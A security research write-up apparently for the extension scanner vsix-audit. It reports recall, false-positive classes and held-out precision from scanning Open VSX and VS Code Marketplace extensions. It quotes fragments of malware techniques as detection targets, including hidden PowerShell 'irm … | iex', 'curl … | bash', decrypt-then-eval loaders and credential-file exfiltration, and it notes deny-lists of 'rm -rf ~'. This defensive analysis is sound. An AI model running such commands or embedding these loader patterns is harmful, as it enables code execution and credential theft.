# What we found scanning the most-downloaded Open VSX extensions

This is the research behind `vsix-audit`: a real scan of the top of the Open VSX registry (the one
Cursor, Windsurf, VSCodium, Gitpod and most AI editors install from), run with this exact
engine. Like [mcp-audit](https://github.com/eltociear/mcp-audit/blob/main/FINDINGS.md) and
[npm-audit](https://github.com/eltociear/npm-audit/blob/main/FINDINGS.md), it is calibrated so that
"clean" means clean before any number is reported.

## Update 2026-11-27 (v0.2.0): recall measured, a third held-out set

The first version was calibrated for precision only: its recall had been checked on canaries we
wrote ourselves. This update measures recall on real and independently written malicious
extensions first, fixes what it missed, and then re-measures precision on a fresh set the engine
had never seen. Everything below the next rule is the original v0.1.0 write-up, unchanged.

### Recall: what v0.1.0 missed

Three malware sets, scanned statically (nothing installed or executed; samples were never
committed and were deleted after the run; [benchmarks/recall_manifest.json](benchmarks/recall_manifest.json)
lists names, versions and SHA-256):

| Set | What it is | v0.1.0 HIGH+ | v0.2.0 HIGH+ |
| --- | --- | --- | --- |
| **Real samples** | 4 removed malicious extensions still archived by researchers: two GlassWorm-linked themes (Socket), a fake Solidity extension (ShowSnowcrypto), a tunnel-exfil "secure code" extension | **1 / 4** | 4 / 4 (tuned on) |
| **Reconstructions** | 20 inert canaries rebuilt from published write-ups (Koi, Socket, Kaspersky, ReversingLabs, Secure Annex, Checkmarx, Check Point, ExtensionTotal); hosts are `.invalid` / TEST-NET | **7 / 20** | 19 / 20 (tuned on) |
| **Third-party canaries** (held out) | 17 malicious samples written by two other projects (`rodhayl/VSCodeAntivir`, `junbjnnn/glassworm-poc`), frozen-engine run | 3 / 17 | **4 / 17** |
| **Marketplace-removed, still on Open VSX** (held out, weak labels) | 18 IDs that Microsoft lists as removed for *Malware* and that still resolve on open-vsx.org | n/a | 0 / 18 |

The last row does not measure recall: a static read of all 18 Open VSX builds found no payload in
any of them (one is built from the same template as the GlassWorm-linked themes above, minus the
encrypted stage: a sleeper). Microsoft's removal applied to Marketplace builds we cannot
download. It is listed so that nobody reads "0/18" as either a miss or a clean bill.

**Benign control: the "Material Theme" scare.** In February 2025 `Equinusocio.vsc-material-theme`
was pulled from the Marketplace as malware and later reinstated: the accusation rested on obfuscated
code in a bundled dependency. Version 34.7.7 (the build current at the time) and 34.7.16 both scan
**SAFE** with v0.1.0 and v0.2.0 (the obfuscated bundle is reported as INFO). A scanner that flags
obfuscation alone would have repeated that false alarm.

The v0.1.0 misses on real malware were not exotic:

- **AES-decrypt-then-eval.** Both GlassWorm-linked themes ship `crypto.createDecipheriv('aes-256-cbc', '<hard-coded key>', …)` over an 8 KB hex blob and `eval` the plaintext. No base64, no `_0x`, no network in the first stage: v0.1.0 saw nothing. → `decrypt_eval`.
- **`irm https://… | iex`.** The fake Solidity extension runs `powershell -WindowStyle Hidden -Command "irm https://…/aaa | iex"`. v0.1.0 only knew the `iex (irm …)` order. → new `download_execute` signature, plus `iwr -OutFile …; Start-Process`, `WebClient.DownloadFile … Start-Process` and `certutil -urlcache`.
- **Obfuscator string tables.** That same command sat in a `javascript-obfuscator` string array with every space written as `\x20`, and the array element looked like a deny-list entry, so the list demotion ate it. → escaped strings are decoded into a second view when that reveals a shell/eval keyword, and list demotion is off inside `_0x` output.
- **Zip layout.** One archived sample is a plain zip of the unpacked folder, not a `.vsix` with `extension/`. → read from the folder that holds `package.json`.

The reconstructions added the shapes write-ups describe but no archived sample showed:
remote JS fetched from a hard-coded host and `eval`'d on a timer (TigerJack) → `remote_eval`;
a `.cmd`/`.vbs`/`.exe` written to `%TEMP%` from a download and launched (WhiteCobra, Aurora Nocturne,
prettier-vscode-plus) → `temp_dropper`; a second-stage `.vsix` downloaded and installed with
`--install-extension` into every editor (GlassWorm 2026) → `vsix_sideload`; a hard-coded GitHub token
polling issues and spawning their bodies (susvsex) → `github_c2`; zero-width-character payloads
(Aurora Nocturne) → `invisible_unicode` now covers U+200B-U+200D/U+2060-U+2064/U+FEFF runs.

**Still missed, on purpose or not:**

- **Source-code theft by a fake AI assistant** (ChatMoss / "ChatGPT 中文版"; the third-party
  `fake-ai-assistant` sample): `document.getText()` posted to a server on every edit is exactly what
  Copilot-style extensions do. A static scan cannot tell the two apart; it stays a known gap.
- **13 of the 17 third-party samples**: 11 of them are defanged demos whose sink is commented out or
  replaced by `console.log` (credential read with no send, a C2 beacon that only logs, a Solana RPC
  call with no memo/eval, a marker variable). They carry no executable payload, and the engine is
  built not to score capabilities alone, so this number will stay low by design. The other two
  (OtterCookie-style socket.io C2 with fingerprinting, the fake AI assistant) are real gaps.
- **Native droppers** (GlassWorm's Zig binary) and **transitive loaders** via `extensionPack` /
  `extensionDependencies`: the binary is listed as INFO, the pack is listed as INFO; neither is
  scored.
- The real-sample and reconstruction rows are **tuning sets**: the rules were written against them,
  so 4/4 and 19/20 say the rules fire, not that they generalise. The held-out rows are the honest
  ones, and they are weak.

### Precision: the old held-out flags, classified

The v0.1.0 held-out sets flagged 17 extensions (9 of 300, 8 of 295). Two were kept on purpose (a
VM-obfuscated bundle, a plain-`http` `curl | bash`). The 15 false positives fall into seven classes:

| Class | Count | v0.1.0 fix | v0.2.0 |
| --- | --- | --- | --- |
| Another vendor's CLI install script (`x.ai`, `cursor.com`, `pi.dev`, `antigravity.google`, `dev.meta.ai`) | 4 | added each domain to a list | **shape rule**: an HTTPS `…/install.sh` / `…-installer.ps1` from a named host is MEDIUM, whatever the host; plain http, raw IPs, paste/gist/tunnel hosts and payload-shaped paths stay CRITICAL |
| Install command shown to the user (HTML, log/error message) | 2 | display/log context | unchanged |
| Deny-list of dangerous commands (`rm -rf ~`) in an agent-safety table | 2 | deny-rule context | unchanged (but not inside obfuscator output) |
| Publisher's own `ovsx publish -p $PAT` (shipped `.sh`, bundled `package.json` scripts) | 3 | release-script context | unchanged |
| SDK reading its **own** Keychain item (bundled Claude Agent SDK) | 2 | Keychain = INFO unless a browser "Safe Storage" key | unchanged |
| Telegram integration using the user's bot token | 1 | hard-coded token required | unchanged |
| Security vendor's own GitHub org installer | 1 | vendor-host MEDIUM | unchanged |

The domain list was the weak point: every held-out set surfaced new coding-agent vendors, so
v0.2.0 replaces "is this a known vendor" with "is this shaped like a published installer".

New rules were checked against the original calibration corpus (the same 950 extension IDs,
re-downloaded 2026-11-27 at their current versions; 937 scanned, 13 over 150 MB skipped). Three
new benign shapes surfaced and became controls in `tests/fixtures/`: the `sudo-prompt` elevation
helper (`elevate.vbs` in temp), a static PowerShell helper written to temp, and the monaco/AMD
module loader (`fetch` + `new Function` with `//# sourceURL`).

| Engine | Calibration corpus (937) HIGH+ | MEDIUM |
| --- | --- | --- |
| v0.1.0 | 3 (0.3%) | 22 |
| v0.2.0 | 3 (0.3%), the same three | 24 |

### Held-out set 3 (fresh, never seen)

900 extensions that were in none of the earlier sets, scanned once with the engine frozen in
commit `5ed9763` (v0.2.0) before the run: **500 from Open VSX** (download ranks 946-1449, 25K-48K
downloads) and, for the first time, **400 from the VS Code Marketplace** (top installs via the
public gallery API, 0.5M-214M installs, excluding anything already scanned). 893 scanned
(6 over 150 MB, 1 failed download); 4.3 GB of text, 304K files. The index is
[benchmarks/heldout3_index.json](benchmarks/heldout3_index.json), per-extension results
[benchmarks/heldout3_results.json](benchmarks/heldout3_results.json) (flagged rows anonymised).

| Set | Scanned | HIGH/CRITICAL | of which false positives | MEDIUM |
| --- | --- | --- | --- | --- |
| Open VSX ranks 946-1449 | 498 | 9 (1.8%) | 6 (1.2%) | 8 |
| VS Code Marketplace top | 395 | 1 (0.3%) | 1 (0.3%) | 2 |
| **All held-out 3** | **893** | **10 (1.1%)** | **7 (0.8%)** | 10 |

So the target (at most 1% HIGH+ false positives on a fresh set) is met for false positives
(**0.8%**), but not for "flagged at all" (**1.1%**), and only on the Marketplace half by a wide
margin. The Open VSX long tail is noisier: smaller publishers ship their release tooling.

What the 10 were:

- **3 true findings (one publisher, three extensions):** each POSTs data to a hard-coded
  `webhook.site` URL, a public request bin that anyone holding the URL can read: JUnit results with
  stack traces and test context, session details, commit notifications. It looks like debugging code
  left in, not an attack, but the user's data does leave to a third-party collector. HIGH is the
  right call. (Not named, per the policy below.)
- **5 publisher release scripts** (`ovsx publish -p $TOKEN`, Open VSX publish-by-token, `npm publish`
  with an auth token) in `publish.js` / `scripts/publish-*.js` / `bin/publish-*.cjs` or a bundled
  `scripts` object with unquoted keys. v0.1.0 already demoted this shape in `.sh` files and quoted
  `package.json` entries; the JS variants were new.
- **1 third-party installer shown as a manual fallback** (`curl -fsSL https://raw.githubusercontent.com/<tool>/…/install.sh | bash  # manual`).
  One of the release-script extensions also carries a whole `installCommand: { linux: "curl … install.sh | sh" }`
  table for half a dozen security tools. Installers on `raw.githubusercontent.com` were deliberately
  kept CRITICAL in v0.2.0.
- **1 tunnel client:** a preview-server extension bundling `localtunnel`, whose default host and
  test regexes contain `localtunnel.me`.

Fixed **after** the run (v0.2.1; not an independent number): JS release scripts (a file named
`*publish*/*release*/*deploy*`, under `scripts/` `bin/` `tools/`, or run by a `package.json` script,
and `publish` matched only within one shell command), a tool's own `install*.sh` in its GitHub repo
and installer domains (`https://atlasgo.sh | sh`) to MEDIUM, and a tunnel service's bare domain or a
tunnel host inside a regex to INFO. With v0.2.1 the same 893 give 3 HIGH+ (the three webhook.site
leaks) and 0 known false positives, which is exactly what an overfit fix would show, so the number
to quote is the frozen one: **0.8% false positives, 1.1% flagged.** The calibration corpus is unchanged
by v0.2.1 (these rules only lower severities; its three HIGH+ stay HIGH+), and recall on all splits
is unchanged (4/4, 19/20, 4/17).

### Still weak

- **Recall on independently written malware is low (4/17)**, mostly because those samples are
  defanged; the two real gaps (fake-AI source exfil, socket.io C2) are behavioural and need data-flow,
  not patterns.
- **Real samples are scarce.** Registries delete malicious versions (all 23 GlassWorm-linked Open VSX
  IDs/versions we tried return 404, and the registry's blob storage serves nothing for them either), so
  4 real archives is what is publicly downloadable today. Most recall evidence is reconstruction.
- **Long-tail Open VSX is noisier than the top.** Expect about 1 in 55 extensions from ranks
  ~1000-1500 to need a look, against 1 in 400 on the Marketplace top.

---

*The original v0.1.0 write-up follows, unchanged.*

## Method

1. Listed the most-downloaded extensions on open-vsx.org (2026-11-24/25), latest version of each:
   from ~97M downloads at rank 1 down to ~47K at rank ~950.
2. **Calibration set:** ranks 1-350. Rules were tuned on these.
3. **Held-out set 1:** ranks 351-650, scanned once with the engine frozen. It surfaced new noise
   classes, so it was folded into calibration and a second set was pulled:
4. **Held-out set 2:** the 300 extensions newly in the top ~950 (ranks ~651-950), scanned once with
   the engine frozen again (committed before the run).
5. For each extension: download the `.vsix` (a zip), read every JS/TS/shell/PowerShell/Python/HTML
   file under `extension/` up to 12 MB each (60 MB of text per extension), list compiled binaries,
   read `package.json`. Nothing is installed or executed. 13 platform-specific packages over 150 MB
   and 1 failed download were skipped.
6. **Corpus: 936 extensions, 315,954 files, 7.2 GB of text.** 20 extensions (2.1%) exceeded the
   60 MB text budget and were scanned partially.

## Headline

| Engine | Set | Flagged HIGH/CRITICAL |
| --- | --- | --- |
| Same signatures, context-blind | ranks 1-650 (641) | 57 (8.9%) |
| Frozen engine, never-seen extensions | held-out 1 (300) | 9 (3.0%) |
| Frozen engine, never-seen extensions | held-out 2 (295) | 8 (2.7%) |
| **Final engine** | **all 936** | **3 (0.3%)**, all kept on purpose |
| Final engine, MEDIUM (reported, exit 0) | all 936 | 22 (2.4%) |

**None of the 936 most-downloaded Open VSX extensions carries a GlassWorm-style payload**: no
invisible-Unicode byte streams, no blockchain or calendar C2, no credential read sitting next to
an exfil endpoint. That is what you would expect from the top of the download chart, where
malicious extensions get reported and pulled before they climb. The point of this corpus is to
measure the noise, so that a CRITICAL on an extension you have *never heard of* means something.

The held-out rows are the number to quote. On popular extensions the engine had never seen,
roughly **1 in 35 needed a human look**, and every one of those turned out to be a benign shape
it had not been taught yet (deny-lists, help panels, vendor installers). The 0.3% is after those
shapes were fixed, on extensions it has now seen, so it is not an independent measurement.

## The noise: what looks dangerous in an extension but isn't

A context-blind pass of the same signatures flags **57 of the top 641 (8.9%)**. The capabilities
behind that noise, by how many of the 936 extensions use them:

| Signal | Extensions | Why it's noise in an extension |
| --- | --- | --- |
| Reads `process.env` | 658 (70%) | Configuration, proxy settings, PATH lookup for a language server |
| Network client | 651 (70%) | Telemetry, update checks, LLM APIs, language-server downloads |
| `child_process` | 611 (65%) | Language servers, linters, formatters, git, terminals |
| Activates on every start (`*` / `onStartupFinished`) | 304 (32%) | Status-bar items, background indexing. 222 of these also spawn processes **and** use the network |
| Pulls other extensions (`extensionPack` / `extensionDependencies`) | 158 (17%) | Packs and companion extensions |
| npm lifecycle script in `package.json` | 126 (13%) | `postinstall` / `prepare` left over from development. VS Code never runs them |
| SecretStorage / `authentication.getSession` | 118 (13%) | Sign-in features storing their own tokens |
| Bundled native binary (`.node`, `.exe`, `.dll`, ...) | 117 (13%) | Language servers, native modules. Not text-scannable: listed, not scored |
| References `~/.ssh`, `~/.aws/credentials`, `~/.npmrc`, kube/docker config | 75 (8%) | Remote-SSH, cloud and registry tooling reading their own config |
| Webhook / tunnel / OAST host string | 38 (4%) | Mostly `ngrok.io` / `oast.*` inside bundled **public-suffix-list** tables; also Telegram integrations using the user's own bot token |
| `curl … \| sh` / `irm … \| iex` string | 24 (3%) | AI-CLI and vendor installers, in help panels, terminal templates and error messages |
| Dangerous command (`rm -rf ~`) | 8 (1%) | **Deny-lists**: auto-approve and agent-safety extensions ship tables of commands to *block* |
| `ovsx` / `vsce publish -p $TOKEN` | 5 (0.5%) | The publisher's own release script, or a bundled copy of `package.json` scripts |
| `JSON.stringify(process.env)` | 5 (0.5%) | Passing the environment to a child shell, with no network send nearby |

The lesson is the same as in [mcp-audit](https://github.com/eltociear/mcp-audit/blob/main/FINDINGS.md)
and [npm-audit](https://github.com/eltociear/npm-audit/blob/main/FINDINGS.md): **every one of these is
a capability, not an attack.** Two things are specific to extensions:

- **"Same file" means nothing in a bundle.** Extensions are typically shipped as one webpack/esbuild
  bundle (the median extension here is ~1 MB of code, the big ones several MB in a single file),
  so the bundle has a network call, `process.env` and `child_process` *somewhere*. Combination rules
  only hold up if the pieces are *near* each other: `vsix-audit` requires the send within
  1.5 KB of an env dump or exfil host, and within 3 KB of a credential read.
- **AI-agent extensions are full of attack-shaped strings.** Coding agents ship deny-lists of
  destructive commands, install other agents' CLIs with `curl | sh`, and render those commands in
  their UI. 2026's top extensions are mostly agents, so this is now the biggest source of noise.
  `vsix-audit` treats a command as data when it is in a list or label, in a comment, in HTML /
  markdown / a log message, or is an installer from the extension's own vendor domain.

## What was actually worth flagging

Three extensions stay HIGH+ with the final engine. All three are stated as *observed patterns*,
not verdicts; intent is the publisher's to explain.

**Browser cookie decryption (HIGH).** One browser-automation extension reads the
`Chrome Safe Storage` key from the macOS Keychain and copies Chrome's `Cookies` database to a temp
directory, which is what you need to decrypt the user's browser sessions. In context it looks like
a "reuse your logged-in session" feature. It is also, step for step, what an infostealer does.
Kept HIGH so that a human decides, not the scanner.

**A VM-obfuscated bundle (HIGH).** One extension ships its main bundle through a virtual-machine
obfuscator: a bytecode interpreter loop whose opcodes include `eval(String.fromCharCode(...))`.
Nothing in it can be read statically. Commercial extensions do obfuscate (five more use
`javascript-obfuscator` and are reported as MEDIUM), but an interpreter that evals strings built at
runtime is the shape of a hidden loader. Kept HIGH.

**Plaintext pipe-to-shell (CRITICAL).** One remote-development extension runs
`curl -s http://… | bash` against its vendor's CDN. No malice, but over plain HTTP anyone on the
network path can replace that script with their own, and it runs with the user's rights. This is a
real weakness. (A second extension prints a similar `http://` one-liner in an error message; that
one is only shown, so it is not scored.)

**Reported as MEDIUM (22 extensions):** 9 pipe their own vendor's HTTPS installer into a shell
(firebase -> `firebase.tools`, snowflake -> `ai.snowflake.com`, a security vendor -> its own GitHub
org), 6 set `NODE_TLS_REJECT_UNAUTHORIZED = "0"` for the whole extension host (one only when the
user forces it), 5 are `javascript-obfuscator` output with eval and network, 2 contact a hard-coded
public IP next to an env read or eval.

## Context worth knowing

- **32% activate on every editor start**, and 222 of the 936 activate on start, spawn processes and
  use the network. That is the normal shape of a modern extension, and it is why one bad update
  matters: it runs on every window, for every user, with no click.
- **13% ship compiled binaries** that no text scanner (this one included) can see into.
- **13% still carry npm `postinstall` / `prepare` scripts.** VS Code never runs them, so they are
  harmless to users, but they run for anyone who `npm install`s the repository.
- **Zero** use Solana RPC at all, so a non-wallet extension that suddenly reads transaction memos
  stands out immediately.

## The attack shapes this is built for

Each of these has an inert canary in `tests/fixtures/` that fires at the stated level:

- **GlassWorm (2025)** put self-spreading extensions into Open VSX and the VS Code Marketplace. The
  loader was **invisible Unicode** (variation selectors on lines that render as empty in every
  editor and diff view), the C2 address was read from a **Solana transaction memo**, with a
  **Google Calendar event** title as a fallback, and it harvested GitHub / npm / Open VSX tokens and
  crypto-wallet extension data to republish itself. → `invisible_unicode`, `blockchain_c2`,
  `calendar_c2`, `worm_propagation`, `wallet_browser_theft`.
- **Token / SSH theft on activation:** read `context.secrets`, an auth session, `~/.ssh/id_*` or
  `~/.aws/credentials` and POST it to a webhook. → `credential_exfil`.
- **Environment dump:** `JSON.stringify(process.env)` straight into a request. → `env_exfil`.
- **Second stage:** `curl … | sh`, `iex (iwr …)`, `eval(await fetch(…))`. → `download_execute`.
- **Reverse shell** on activation. → `reverse_shell`.

## Takeaways

1. **An extension is code running as you.** Treat installing one like `curl | sh`: check the
   publisher, the activation events and what it bundles, especially on Open VSX.
2. **Startup activation is the multiplier.** An extension that activates on `"*"` or
   `onStartupFinished` runs on every window with no user action. `vsix-audit` escalates findings in
   those entry files to CRITICAL.
3. **Score combinations, not capabilities.** `child_process`, `process.env`, SecretStorage and
   bundled binaries are in most of the top extensions. Theft is a credential read *next to* an exfil
   endpoint and a send; a C2 is a memo/calendar read *next to* decode + eval.
4. **Re-scan on every update.** Extensions auto-update. A clean version today says nothing about
   next week's: `vsix_audit.py --installed` in a scheduled job covers it.

---

Run it yourself: `python vsix_audit.py --openvsx <publisher.name>` or `python vsix_audit.py --installed`.

*Findings are pattern matches warranting human review, not verdicts. No extension in the scanned
corpus is accused of anything; flagged behaviour is described without naming the extension.
Suspected malicious extensions should be reported to the registry (Open VSX:
https://github.com/EclipseFdn/open-vsx.org/issues, VS Marketplace: "Report Abuse") and the
publisher, not published as unverified accusations.*
